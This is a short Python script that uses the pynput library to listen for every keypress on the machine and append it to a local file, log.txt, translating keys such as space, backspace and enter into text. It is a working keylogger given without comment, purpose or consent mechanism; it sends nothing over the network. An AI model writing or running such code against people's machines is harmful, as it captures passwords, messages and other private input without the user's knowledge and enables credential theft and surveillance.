from pynput.keyboard import Listener

def write_to_file(key):
    keydata = str(key).replace("'", "")
    keydata = keydata.replace("Key.delete", " [DELETE] ")

    if keydata == "Key.space":
        keydata = " "
    if keydata == "Key.backspace":
        keydata = "<- "
    if keydata in ("Key.shift_r", "Key.shift"):
        keydata = ""
    if keydata == "Key.enter":
        keydata = "\n"

    with open("log.txt", "a", encoding="utf-8") as f:
        f.write(keydata)

with Listener(on_press=write_to_file) as l:
    l.join()